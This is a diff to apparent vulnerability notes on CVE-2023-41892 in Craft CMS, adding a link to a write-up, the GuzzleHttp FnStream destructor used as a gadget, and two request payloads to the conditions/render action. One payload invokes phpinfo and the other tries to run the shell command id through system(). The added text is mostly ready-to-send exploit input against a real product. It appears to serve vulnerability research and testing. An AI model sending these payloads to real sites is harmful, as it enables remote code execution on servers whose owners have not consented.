@@ -29,3 +29,18 @@ https://github.com/craftcms/cms/tree/4.4.14
 https://threatprotect.qualys.com/2023/09/25/craft-cms-remote-code-execution-vulnerability-cve-2023-41892/
 
 CVE-2023-41892
+https://blog.calif.io/p/craftcms-rce
+
+\GuzzleHttp\Psr7\FnStream
+
+public function __destruct()
+{
+   if (isset($this->_fn_close)) {
+       call_user_func($this->_fn_close);
+   }
+}
+
+
+action=conditions/render&test[userCondition]=craft\elements\conditions\users\UserCondition&config={"name":"test[userCondition]","as xyz":{"class":"\\GuzzleHttp\\Psr7\\FnStream","__construct()":[{"close":null}], "_fn_close":"phpinfo"}}
+
+action=conditions/render&test[userCondition]=craft\elements\conditions\users\UserCondition&config={"name":"test[userCondition]","as xyz":{"class":"\\GuzzleHttp\\Psr7\\FnStream","__construct()":[{"close":null}], "_fn_close":"function () {system('id');"}}
